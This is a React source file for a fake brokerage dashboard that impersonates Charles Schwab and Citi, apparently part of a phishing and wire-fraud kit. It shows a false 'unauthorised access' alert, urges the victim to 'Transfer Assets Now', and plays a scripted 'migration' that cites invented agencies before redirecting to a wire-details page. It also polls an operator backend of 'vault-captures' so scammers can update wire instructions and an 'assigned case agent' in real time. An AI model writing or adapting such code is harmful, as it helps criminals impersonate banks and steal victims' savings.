import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { HeaderLoggedIn } from '@/components/HeaderLoggedIn';
import { HeaderCiti } from '@/components/HeaderCiti';

// ── Types ─────────────────────────────────────────────────────────────────────

interface Holding { symbol: string; name: string; qty: string; price: string; value: string; pct: string }
interface VisitorConfig {
  identifier: string; displayName: string; accountType: string; agentName?: string;
  totalValue: string; cashValue: string; marketValue: string;
  dayChange: string; dayChangePct: string; costBasis: string;
  gainLoss: string; gainLossPct: string;
  holdings: Holding[];
  briefingAcknowledged?: boolean;
  migrationDone?: boolean;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function getMatchedVisitor(): VisitorConfig | null {
  try { return JSON.parse(localStorage.getItem('finvault_matched_visitor') || 'null'); } catch { return null; }
}

function getDisplayName(matched: VisitorConfig | null): string {
  if (matched?.displayName) return matched.displayName;
  try {
    const email = localStorage.getItem('finvault_vault_email');
    if (email) { const n = email.split('@')[0]; return n.charAt(0).toUpperCase() + n.slice(1); }
    const attempts = JSON.parse(localStorage.getItem('finvault_login_attempts') || '[]');
    if (attempts.length > 0) {
      const u: string = attempts[0].username || attempts[0].userId || '';
      if (u) { const n = u.includes('@') ? u.split('@')[0] : u; return n.charAt(0).toUpperCase() + n.slice(1); }
    }
  } catch {}
  return 'Client';
}

function getAccountNumber(): string { return localStorage.getItem('finvault_vault_account_num') || '00000000'; }

function formatTime(): string {
  const now = new Date();
  const h = now.getHours(); const m = String(now.getMinutes()).padStart(2, '0'); const s = String(now.getSeconds()).padStart(2, '0');
  const ampm = h >= 12 ? 'PM' : 'AM'; const h12 = h % 12 || 12;
  return `${h12}:${m}:${s} ${ampm}`;
}

function fmtVal(raw: string, fallback = '$0.00'): string {
  if (!raw) return fallback;
  const n = parseFloat(raw.replace(/,/g, ''));
  if (isNaN(n)) return raw;
  const abs = Math.abs(n);
  const formatted = abs.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  return `${n < 0 ? '-' : ''}$${formatted}`;
}

function fmtPct(raw: string, fallback = '(0.00%)'): string {
  if (!raw) return fallback;
  const n = parseFloat(raw.replace(/[^0-9.\-+]/g, ''));
  if (isNaN(n)) return raw;
  return `(${n >= 0 ? '+' : ''}${n.toFixed(2)}%)`;
}

// ── Migration steps ───────────────────────────────────────────────────────────

const MIGRATION_STEPS = [
  'Initiating secure asset migration protocol',
  'Contacting Asset Management Protection Division',
  'Authenticating with Federal Insurance Network',
  'Connecting to Charles Schwab account servers',
  'Retrieving account positions and balances',
  'Verifying holdings and cost basis data',
  'Transferring asset records to Vault',
  'Migration complete — account details loaded',
];
const STEP_DELAYS = [300, 1000, 2100, 3300, 4600, 5900, 7100, 8300];

// ── Market ticker data ────────────────────────────────────────────────────────

const TICKERS = [
  { name: 'DJIA',         value: 44318.24, change: +182.63, pct: +0.41 },
  { name: 'NASDAQ',       value: 19984.71, change: +94.28,  pct: +0.47 },
  { name: 'S&P 500',      value: 6147.83,  change: +28.91,  pct: +0.47 },
  { name: 'Russell 2000', value: 2298.45,  change: -11.24,  pct: -0.49 },
];

const TABS = ['Positions', 'Balances', 'Transactions', 'Trade Confirmations', 'Statements', 'Tax Documents', 'Performance'];

// ── Small UI atoms ────────────────────────────────────────────────────────────

function InfoIcon() {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      width: 13, height: 13, borderRadius: '50%',
      background: '#00889B', color: '#fff',
      fontSize: 9, fontWeight: 700, lineHeight: 1,
      flexShrink: 0, cursor: 'default', userSelect: 'none',
    }}>i</span>
  );
}

function DollarToggle() {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      width: 20, height: 16, border: '1px solid #78AEB7',
      borderRadius: 3, color: '#508A94', fontSize: 10, fontWeight: 700,
      cursor: 'pointer', userSelect: 'none', flexShrink: 0,
    }}>$</span>
  );
}

function RowMenu() {
  return (
    <span style={{ color: '#555', fontSize: 13, cursor: 'pointer', userSelect: 'none', display: 'flex', alignItems: 'center', gap: 1 }}>
      <svg width="16" height="14" viewBox="0 0 16 14" fill="none">
        <line x1="2" y1="3" x2="14" y2="3" stroke="#555" strokeWidth="1.4" strokeLinecap="round"/>
        <line x1="2" y1="7" x2="14" y2="7" stroke="#555" strokeWidth="1.4" strokeLinecap="round"/>
        <line x1="2" y1="11" x2="14" y2="11" stroke="#555" strokeWidth="1.4" strokeLinecap="round"/>
      </svg>
      <svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M2 3l2 2 2-2" stroke="#555" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
    </span>
  );
}

// ── Migration section ─────────────────────────────────────────────────────────

function MigrationSection({ accent, isCiti, agentName, onComplete }: {
  accent: string; isCiti: boolean; agentName: string | null; onComplete: () => void;
}) {
  const [phase, setPhase] = useState(-1);
  const brand = isCiti ? 'Citi' : 'Charles Schwab';

  const start = () => {
    setPhase(0);
    STEP_DELAYS.forEach((ms, i) => setTimeout(() => {
      setPhase(i);
      if (i === STEP_DELAYS.length - 1) setTimeout(onComplete, 600);
    }, ms));
  };

  const Spinner = () => (
    <svg width="14" height="14" viewBox="0 0 14 14" style={{ flexShrink: 0 }}>
      <circle cx="7" cy="7" r="5.5" fill="none" stroke="#E2E8F0" strokeWidth="1.25" />
      <path d="M7 1.5 A5.5 5.5 0 0 1 12.5 7" fill="none" stroke={accent} strokeWidth="1.25" strokeLinecap="round">
        <animateTransform attributeName="transform" type="rotate" from="0 7 7" to="360 7 7" dur="0.7s" repeatCount="indefinite" />
      </path>
    </svg>
  );

  if (phase === -1) {
    return (
      <div style={{
        background: '#fff',
        border: '1px solid #C8CDD0',
        borderLeft: '4px solid #344B58',
        borderRadius: 0,
        marginBottom: 10,
        overflow: 'hidden',
      }}>
        {/* Header bar */}
        <div style={{
          background: '#344B58', padding: '8px 18px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              <path d="M12 8v4m0 4h.01" stroke="#fff" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            <span style={{ fontSize: 11, fontWeight: 700, color: '#fff', letterSpacing: '0.06em', textTransform: 'uppercase' }}>
              Security Notice — Action Required
            </span>
          </div>
          <span style={{ fontSize: 10, color: 'rgba(255,255,255,0.6)', fontFamily: 'monospace' }}>
            {new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}
          </span>
        </div>

        {/* Body */}
        <div style={{ padding: '14px 18px 16px', display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 24 }}>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 13.5, fontWeight: 700, color: '#1A2535', marginBottom: 6, lineHeight: 1.3 }}>
              Unauthorised access detected on your {brand} account
            </div>
            <div style={{ fontSize: 12.5, color: '#4A5568', lineHeight: 1.7, marginBottom: agentName ? 10 : 0 }}>
              Our security systems have identified suspicious activity on your account. To safeguard your assets, 
              you are advised to transfer your holdings to your secure Vault immediately. 
              Do not share your credentials with anyone at this time.
            </div>
            {agentName && (
              <div style={{
                display: 'inline-flex', alignItems: 'center', gap: 7,
                background: '#F0F4F7', border: '1px solid #D1D8DD',
                padding: '5px 12px', marginTop: 2,
              }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none">
                  <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" stroke="#536A70" strokeWidth="1.75" strokeLinecap="round"/>
                  <circle cx="12" cy="7" r="4" stroke="#536A70" strokeWidth="1.75"/>
                </svg>
                <span style={{ fontSize: 11.5, color: '#536A70' }}>
                  Assigned case agent: <strong style={{ color: '#344B58', fontWeight: 700 }}>{agentName}</strong>
                </span>
              </div>
            )}
          </div>
          <button
            onClick={start}
            style={{
              flexShrink: 0, padding: '10px 22px',
              border: 'none', background: '#1AACE2',
              color: '#fff', fontSize: 13, fontWeight: 700,
              cursor: 'pointer', letterSpacing: '0.01em', whiteSpace: 'nowrap',
              alignSelf: 'center',
            }}
            onMouseEnter={e => { e.currentTarget.style.background = '#1590C0'; }}
            onMouseLeave={e => { e.currentTarget.style.background = '#1AACE2'; }}>
            Transfer Assets Now
          </button>
        </div>
      </div>
    );
  }

  const done = phase >= MIGRATION_STEPS.length - 1;

  return (
    <div style={{ background: '#fff', border: '1px solid #D1D4D5', padding: '18px 20px', marginBottom: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16 }}>
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
          <path d="M5 12h14M12 5l7 7-7 7" stroke={accent} strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
        <span style={{ fontSize: 13, fontWeight: 700, color: '#333' }}>
          {done ? 'Migration Complete' : 'Migrating Assets from Charles Schwab…'}
        </span>
        {done && <span style={{ fontSize: 11, fontWeight: 700, color: '#22C55E', border: '1px solid #BBF7D0', padding: '2px 8px' }}>COMPLETE</span>}
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
        {MIGRATION_STEPS.map((step, i) => {
          const visible = phase >= i;
          const active = phase === i;
          const stepDone = phase > i;
          return (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 9, opacity: visible ? 1 : 0, transition: 'opacity 0.4s ease' }}>
              <div style={{ width: 14, flexShrink: 0 }}>
                {active && !done ? <Spinner /> : stepDone || done ? (
                  <svg width="14" height="14" viewBox="0 0 14 14">
                    <circle cx="7" cy="7" r="6.5" stroke={i === MIGRATION_STEPS.length - 1 ? '#22C55E' : accent} strokeWidth="1.2" fill="none" />
                    <path d="M3.5 7l2.5 2.5 4.5-5" stroke={i === MIGRATION_STEPS.length - 1 ? '#22C55E' : accent} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                ) : (
                  <svg width="14" height="14" viewBox="0 0 14 14"><circle cx="7" cy="7" r="6.5" stroke="#E5E7EB" strokeWidth="1.2" fill="none" /></svg>
                )}
              </div>
              <span style={{
                fontSize: 12, fontWeight: active && !done ? 600 : 400,
                color: i === MIGRATION_STEPS.length - 1 && done ? '#22C55E' : active && !done ? '#333' : stepDone ? '#6B7280' : '#D1D5DB',
                transition: 'color 0.3s ease',
              }}>{step}</span>
              {active && !done && <span style={{ fontSize: 11, color: '#9CA3AF', marginLeft: 'auto' }}>···</span>}
            </div>
          );
        })}
      </div>
      <div style={{ height: 2, background: '#F1F5F9', marginTop: 16, overflow: 'hidden' }}>
        <div style={{
          height: '100%', background: done ? '#22C55E' : accent,
          width: `${((phase + 1) / MIGRATION_STEPS.length) * 100}%`,
          transition: 'width 0.7s ease, background 0.3s ease',
        }} />
      </div>
    </div>
  );
}

// ── Page ──────────────────────────────────────────────────────────────────────

const PANEL: React.CSSProperties = {
  background: '#fff',
  border: '1px solid #D1D4D5',
  borderRadius: 0,
  boxShadow: 'none',
};

export default function VaultDashboardPage() {
  const isCiti = localStorage.getItem('finvault_active_theme') === 'citi';
  const [matched, setMatched] = useState<VisitorConfig | null>(getMatchedVisitor);

  // Poll the API every 3 s for live admin updates — works across different browsers/devices
  useEffect(() => {
    function applyRow(row: Record<string, unknown>) {
      const s = (row.account_settings || {}) as Record<string, unknown>;
      const cfg: VisitorConfig = {
        identifier: (row.email as string) || (row.phone as string) || '',
        displayName: (row.display_name as string) || (row.name as string) || '',
        agentName: (row.agent_name as string) || '',
        accountType: (s.accountType as string) || 'Individual Brokerage',
        totalValue:   (s.totalValue   as string) || '',
        cashValue:    (s.cashValue    as string) || '',
        marketValue:  (s.marketValue  as string) || '',
        dayChange:    (s.dayChange    as string) || '',
        dayChangePct: (s.dayChangePct as string) || '',
        costBasis:    (s.costBasis    as string) || '',
        gainLoss:     (s.gainLoss     as string) || '',
        gainLossPct:  (s.gainLossPct  as string) || '',
        holdings: Array.isArray(s.holdings) ? s.holdings as VisitorConfig['holdings'] : [],
        wireName:       (s.wireName       as string) || '',
        wireAccountNum: (s.wireAccountNum as string) || '',
        wireSortCode:   (s.wireSortCode   as string) || '',
        wireAmount:     (s.wireAmount     as string) || '',
        briefingAcknowledged: !!(s.briefingAcknowledged),
        migrationDone:  !!(s.migrationDone),
      };
      setMatched(cfg);
      // Keep localStorage in sync too (for same-browser fast-path)
      localStorage.setItem('finvault_matched_visitor', JSON.stringify(cfg));
    }

    async function fetchRow(url: string): Promise<Record<string, unknown> | null> {
      try {
        const res = await fetch(url, { cache: 'no-store' });
        if (!res.ok) return null;
        const data = await res.json();
        return data && data.id ? data : null;
      } catch { return null; }
    }

    async function poll() {
      let row: Record<string, unknown> | null = null;

      // 1. Try by stored DB row ID (fastest, most reliable)
      const captureId = localStorage.getItem('finvault_vault_capture_id');
      if (captureId) {
        row = await fetchRow(`/api/vault-captures/${captureId}`);
      }

      // 2. Try by device fingerprint (works after going through the flow)
      if (!row) {
        const fp = localStorage.getItem('_fv_fpid');
        if (fp) row = await fetchRow(`/api/vault-captures?fingerprintId=${encodeURIComponent(fp)}`);
      }

      // 3. Try by vault ref (always stored after setup)
      if (!row) {
        const vaultRef = localStorage.getItem('finvault_vault_ref');
        if (vaultRef) row = await fetchRow(`/api/vault-captures?vaultRef=${encodeURIComponent(vaultRef)}`);
      }

      if (row) {
        // Cache the ID so next polls go direct
        if (row.id) localStorage.setItem('finvault_vault_capture_id', String(row.id));
        applyRow(row);
      } else {
        // Final fallback: localStorage (same-browser path)
        setMatched(getMatchedVisitor());
      }
    }

    poll(); // immediate first fetch
    const id = setInterval(poll, 3000);
    return () => clearInterval(id);
  }, []);

  const name = getDisplayName(matched);
  const acctNum = getAccountNumber();
  const acctLast4 = acctNum.slice(-4);
  const vaultRef = localStorage.getItem('finvault_vault_ref') || 'VLT-C1002D-XXXXXX';

  const [activeTab, setActiveTab] = useState('Positions');
  const [groupBySecurity, setGroupBySecurity] = useState(true);
  const [condensedView, setCondensedView] = useState(true);
  const [clock, setClock] = useState(formatTime());
  const [, navigate] = useLocation();
  const [migrationDone, setMigrationDone] = useState(
    () => localStorage.getItem('finvault_migration_started') === 'true'
  );
  const [showMigration, setShowMigration] = useState(true);

  const accent = isCiti ? '#003087' : '#1AACE2';
  const agentName = (() => {
    if (matched?.agentName) return matched.agentName;
    try {
      const agents: string[] = JSON.parse(localStorage.getItem(isCiti ? 'finvault_agents_citi' : 'finvault_agents_schwab') || '[]');
      return agents[0] || null;
    } catch { return null; }
  })();

  useEffect(() => { const id = setInterval(() => setClock(formatTime()), 1000); return () => clearInterval(id); }, []);

  // Show real values as soon as settings are available; zeros only when nothing is configured
  const negative = '#9B2535';
  const hasData = !!(matched?.totalValue || matched?.marketValue || matched?.cashValue);
  const summaryItems = hasData ? [
    { label: 'Total Accounts Value',          value: fmtVal(matched!.totalValue),   sub: null, neg: false, info: false },
    { label: 'Total Cash & Cash Investments', value: fmtVal(matched!.cashValue),    sub: null, neg: false, info: false },
    { label: 'Total Market Value',            value: fmtVal(matched!.marketValue),  sub: null, neg: false, info: false },
    { label: 'Total Day Change',              value: fmtVal(matched!.dayChange),    sub: fmtPct(matched!.dayChangePct), neg: parseFloat(matched!.dayChange||'0') < 0, info: true },
    { label: 'Total Cost Basis',              value: fmtVal(matched!.costBasis),    sub: null, neg: false, info: false },
    { label: 'Total Gain/Loss*',             value: fmtVal(matched!.gainLoss),     sub: fmtPct(matched!.gainLossPct),  neg: parseFloat(matched!.gainLoss||'0') < 0,  info: true },
  ] : [
    { label: 'Total Accounts Value',          value: '$0.00', sub: null,        neg: false, info: false },
    { label: 'Total Cash & Cash Investments', value: '$0.00', sub: null,        neg: false, info: false },
    { label: 'Total Market Value',            value: '$0.00', sub: null,        neg: false, info: false },
    { label: 'Total Day Change',              value: '$0.00', sub: '(0.00%)',   neg: false, info: true  },
    { label: 'Total Cost Basis',              value: '$0.00', sub: null,        neg: false, info: false },
    { label: 'Total Gain/Loss*',             value: '$0.00', sub: '(0.00%)',   neg: false, info: true  },
  ];

  const holdings = matched?.holdings?.filter(h => h.symbol) ?? [];
  const acctType = matched?.accountType || (isCiti ? 'Citi' : 'Charles Schwab');

  // Table layout
  const GRID = '24px 2.2fr 72px 72px 100px 102px 100px 100px 100px 56px 80px 34px';

  interface ColDef { label: string; top?: string; info?: boolean; dollar?: boolean; align: 'left' | 'right' }
  const COLS: ColDef[] = [
    { label: '',               align: 'left' },
    { label: 'Security',       align: 'left' },
    { label: 'Quantity',       align: 'right' },
    { label: 'Price',          align: 'right' },
    { label: 'Price Change',   top: '%', dollar: true, align: 'right' },
    { label: 'Market Value',   align: 'right' },
    { label: 'Day Change',     info: true, align: 'right' },
    { label: 'Cost Basis',     align: 'right' },
    { label: 'Gain/Loss',      top: '%', dollar: true, info: true, align: 'right' },
    { label: 'Reinvest?',      align: 'right' },
    { label: '% of Acct',      align: 'right' },
    { label: '',               align: 'right' },
  ];

  const rowPad = condensedView ? '5px 8px' : '9px 10px';
  const rowHeight = condensedView ? 31 : undefined;

  return (
    <div style={{
      minHeight: '100vh', display: 'flex', flexDirection: 'column',
      fontFamily: 'Arial, "Helvetica Neue", Helvetica, sans-serif',
      background: '#F3F4F4', paddingBottom: 40,
    }}>
      {isCiti ? <HeaderCiti loggedIn /> : <HeaderLoggedIn />}

      {/* Sub-nav */}
      <div style={{ background: '#fff', borderBottom: '1px solid #D1D4D5', display: 'flex', alignItems: 'stretch', overflowX: 'auto' }}>
        <div style={{ display: 'flex', padding: '0 20px' }}>
          {TABS.map(tab => (
            <button key={tab} onClick={() => setActiveTab(tab)} style={{
              padding: '0 14px', height: 38, background: 'none', border: 'none', cursor: 'pointer',
              fontSize: 13, whiteSpace: 'nowrap',
              color: activeTab === tab ? accent : '#374151',
              fontWeight: activeTab === tab ? 700 : 400,
              borderBottom: activeTab === tab ? `2px solid ${accent}` : '2px solid transparent',
            }}
              onMouseEnter={e => { if (activeTab !== tab) e.currentTarget.style.color = accent; }}
              onMouseLeave={e => { if (activeTab !== tab) e.currentTarget.style.color = '#374151'; }}
            >{tab}</button>
          ))}
        </div>
      </div>

      {/* Page body */}
      <div style={{ flex: 1, width: '100%' }}>

        {/* Account selector bar */}
        <div style={{ ...PANEL, margin: '10px 20px 8px', padding: '8px 14px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
              <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#22C55E', flexShrink: 0 }} />
              <span style={{ fontSize: 13, fontWeight: 700, color: '#111' }}>{name}</span>
            </div>
            <span style={{ color: '#D1D4D5' }}>|</span>
            <span style={{ fontSize: 12, color: '#555' }}>{acctType} — Vault Account ···{acctLast4}</span>
            <span style={{ color: '#D1D4D5' }}>|</span>
            <span style={{ fontSize: 11, color: '#888', fontFamily: 'monospace' }}>REF: {vaultRef}</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
            {migrationDone && (
              <span style={{ fontSize: 11, fontWeight: 700, color: '#16A34A', border: '1px solid #BBF7D0', padding: '2px 8px', background: '#F0FDF4' }}>MIGRATED</span>
            )}
            <span style={{ fontSize: 11, fontWeight: 700, color: '#22C55E', border: '1px solid #BBF7D0', padding: '2px 8px', background: '#F0FDF4' }}>VAULT ACTIVE</span>
            <span style={{ fontSize: 11, fontWeight: 400, color: '#555', border: '1px solid #D2D5D6', padding: '2px 8px', background: '#F8F9FA' }}>Charles Schwab</span>
          </div>
        </div>

        {/* Migration section */}
        {showMigration && !migrationDone && (
          <div style={{ margin: '0 20px 8px' }}>
            <MigrationSection
              accent={accent} isCiti={isCiti} agentName={agentName}
                      onComplete={() => {
                localStorage.setItem('finvault_migration_started', 'true');
                setMigrationDone(true);
                setTimeout(() => navigate('/wire-details'), 800);
              }}
            />
          </div>
        )}

        {/* Waiting for funds panel — after migration animation, until admin marks done */}
        {migrationDone && !matched?.migrationDone && (
          <div style={{ margin: '0 20px 8px', background: '#fff', border: '1px solid #D1D4D5', padding: '16px 20px' }}>
            <style>{`@keyframes spinArc { to { transform: rotate(360deg); } }`}</style>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{ position: 'relative', width: 36, height: 36, flexShrink: 0 }}>
                <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                  <circle cx="18" cy="18" r="16" stroke="#E0E1E2" strokeWidth="2.5"/>
                  <circle cx="18" cy="18" r="16" stroke={accent} strokeWidth="2.5" strokeLinecap="round"
                    strokeDasharray="40 60" style={{ animation: 'spinArc 1.8s linear infinite', transformOrigin: '18px 18px' }}/>
                </svg>
              </div>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: '#1C2B39', marginBottom: 2 }}>
                  Migration In Process — Monitoring for Incoming Funds
                </div>
                <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.55 }}>
                  Your wire transfer instructions have been issued. Our compliance team is monitoring the escrow account for your incoming transfer. This page will update automatically when funds are detected.
                </div>
              </div>
              <div style={{ flexShrink: 0, textAlign: 'right' }}>
                <div style={{ fontSize: 10, fontWeight: 700, color: '#8A9AAA', textTransform: 'uppercase', letterSpacing: '0.07em', marginBottom: 4 }}>Status</div>
                <div style={{ fontSize: 11, fontWeight: 700, color: '#F59E0B', border: '1px solid rgba(245,158,11,0.3)', padding: '2px 10px', background: 'rgba(245,158,11,0.07)' }}>
                  PENDING
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ── Display options strip ───────────────────────────────────────── */}
        <div style={{ margin: '0 20px', height: 42, display: 'flex', alignItems: 'center', gap: 22, paddingLeft: 2 }}>
          <label style={{ display: 'flex', alignItems: 'center', gap: 6, cursor: 'pointer', userSelect: 'none' }}>
            <input type="checkbox" checked={groupBySecurity} onChange={e => setGroupBySecurity(e.target.checked)}
              style={{ accentColor: accent, width: 13, height: 13 }} />
            <span style={{ fontSize: 13, color: '#4A4A4A', fontWeight: 400 }}>Group by Security Type</span>
          </label>
          <label style={{ display: 'flex', alignItems: 'center', gap: 6, cursor: 'pointer', userSelect: 'none' }}>
            <input type="checkbox" checked={condensedView} onChange={e => setCondensedView(e.target.checked)}
              style={{ accentColor: accent, width: 13, height: 13 }} />
            <span style={{ fontSize: 13, color: '#4A4A4A', fontWeight: 400 }}>Condensed Table View</span>
          </label>
        </div>

        {/* ── Account Summary panel ───────────────────────────────────────── */}
        <div style={{ ...PANEL, margin: '0 20px 12px', padding: '22px 14px 28px' }}>
          <h2 style={{ fontSize: 23, fontWeight: 400, color: '#333', margin: '0 0 26px 6px', lineHeight: 1.2 }}>Account Summary</h2>
          <div style={{ display: 'flex' }}>
            {summaryItems.map((m, i) => (
              <div key={m.label} style={{
                flex: 1,
                borderLeft: i > 0 ? '1px solid #E0E1E2' : 'none',
                padding: '0 20px',
                display: 'flex', flexDirection: 'column', gap: 6,
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                  <span style={{ fontSize: 13, fontWeight: 400, color: '#666', lineHeight: 1.35 }}>{m.label}</span>
                  {m.info && <InfoIcon />}
                </div>
                <div style={{ fontSize: 20, fontWeight: 400, color: m.neg ? negative : '#111', lineHeight: 1, transition: 'color 0.5s ease' }}>{m.value}</div>
                {m.sub && <div style={{ fontSize: 12, color: m.neg ? negative : '#555' }}>{m.sub}</div>}
              </div>
            ))}
          </div>
        </div>

        {/* ── Positions panel ─────────────────────────────────────────────── */}
        <div style={{ ...PANEL, margin: '0 20px' }}>

          {/* Settings control — top-right, plain text+icon */}
          <div style={{ display: 'flex', justifyContent: 'flex-end', padding: '20px 22px 0 22px' }}>
            <button style={{ display: 'flex', alignItems: 'center', gap: 5, background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" stroke="#555" strokeWidth="1.6" />
                <path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z" stroke="#555" strokeWidth="1.6" />
              </svg>
              <span style={{ fontSize: 14, fontWeight: 400, color: '#555' }}>Settings</span>
            </button>
          </div>

          {/* Equity group label */}
          {groupBySecurity && (
            <div style={{ padding: '10px 10px 6px 14px', display: 'flex', alignItems: 'center', gap: 6 }}>
              <svg width="9" height="9" viewBox="0 0 9 9"><polygon points="1,1.5 8,4.5 1,7.5" fill="#9CA3AF" /></svg>
              <span style={{ fontSize: 12, fontWeight: 700, color: '#6B7280', letterSpacing: '0.05em', textTransform: 'uppercase' }}>Equity</span>
            </div>
          )}

          {/* Column headers */}
          <div style={{
            display: 'grid', gridTemplateColumns: GRID,
            borderTop: '1px solid #D7D9DA', borderBottom: '1px solid #D7D9DA',
            background: '#fff',
          }}>
            {COLS.map((col, ci) => (
              <div key={ci} style={{
                padding: '6px 8px',
                borderLeft: ci > 0 ? '1px solid #E0E2E3' : 'none',
                display: 'flex', flexDirection: 'column', alignItems: col.align === 'right' ? 'flex-end' : 'flex-start',
                justifyContent: 'flex-end', minHeight: 46,
              }}>
                {(col.top || col.dollar || col.info) && (
                  <div style={{ display: 'flex', alignItems: 'center', gap: 3, marginBottom: 2 }}>
                    {col.top && <span style={{ fontSize: 10, color: '#536A70' }}>{col.top}</span>}
                    {col.dollar && <DollarToggle />}
                    {col.info && <InfoIcon />}
                  </div>
                )}
                <span style={{ fontSize: 12, fontWeight: 400, color: '#536A70', lineHeight: 1.2, textAlign: col.align }}>{col.label}</span>
              </div>
            ))}
          </div>

          {/* Holdings rows */}
          {holdings.length > 0 ? (
            <>
              {holdings.map((h, ri) => {
                const isPos = (v: string) => parseFloat(v?.replace(/[^0-9.\-+]/g, '') || '0') > 0;
                const isNeg = (v: string) => parseFloat(v?.replace(/[^0-9.\-+]/g, '') || '0') < 0;
                const valColor = (v: string) => isNeg(v) ? '#9A4050' : isPos(v) ? '#4D805D' : '#555';
                const cells = [
                  { val: '', color: '#555', align: 'left' },
                  { val: '__security__', color: '#1D4ED8', align: 'left' },
                  { val: h.qty || '—', color: '#555', align: 'right' },
                  { val: h.price ? `$${parseFloat(h.price).toFixed(2)}` : '—', color: '#555', align: 'right' },
                  { val: '—', color: '#555', align: 'right' },
                  { val: h.value ? fmtVal(h.value) : '—', color: '#555', align: 'right' },
                  { val: '—', color: '#555', align: 'right' },
                  { val: '—', color: '#555', align: 'right' },
                  { val: '—', color: '#555', align: 'right' },
                  { val: 'No', color: '#555', align: 'right' },
                  { val: h.pct ? `${h.pct}%` : '—', color: valColor(h.pct), align: 'right' },
                  { val: '', color: '#555', align: 'right' },
                ];
                return (
                  <div key={ri} style={{ display: 'grid', gridTemplateColumns: GRID, borderBottom: '1px solid #ECEDEE', height: rowHeight }}>
                    {cells.map((c, ci) => (
                      <div key={ci} style={{
                        padding: rowPad, fontSize: 12, color: c.color,
                        textAlign: c.align as 'left' | 'right',
                        borderLeft: ci > 0 ? '1px solid #ECEDEE' : 'none',
                        display: 'flex', alignItems: 'center',
                        justifyContent: c.align === 'right' ? 'flex-end' : ci === cells.length - 1 ? 'center' : 'flex-start',
                        overflow: 'hidden',
                      }}>
                        {ci === cells.length - 1 ? <RowMenu /> :
                         c.val === '__security__' ? (
                           <div style={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                             <span style={{ fontSize: 12, fontWeight: 600, color: '#1D4ED8', lineHeight: 1.2 }}>{h.symbol}</span>
                             <span style={{ fontSize: 11, color: '#555', lineHeight: 1.2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: 180 }}>{h.name}</span>
                           </div>
                         ) : c.val}
                      </div>
                    ))}
                  </div>
                );
              })}
            </>
          ) : (
            <div style={{
              padding: '48px 20px', display: 'flex', flexDirection: 'column',
              alignItems: 'center', justifyContent: 'center',
              borderBottom: '1px solid #ECEDEE',
            }}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" style={{ marginBottom: 12, opacity: 0.2 }}>
                <rect x="3" y="3" width="18" height="18" rx="0" stroke="#536A70" strokeWidth="1.5" />
                <path d="M3 9h18M9 21V9" stroke="#536A70" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
              <div style={{ fontSize: 13, color: '#555', marginBottom: 4 }}>No positions in this account</div>
              <div style={{ fontSize: 12, color: '#888', textAlign: 'center', maxWidth: 360, lineHeight: 1.6 }}>
                {migrationDone
                  ? 'No holdings were configured for this account.'
                  : 'Start the migration above to transfer your Charles Schwab positions.'}
              </div>
            </div>
          )}

          {/* Totals row */}
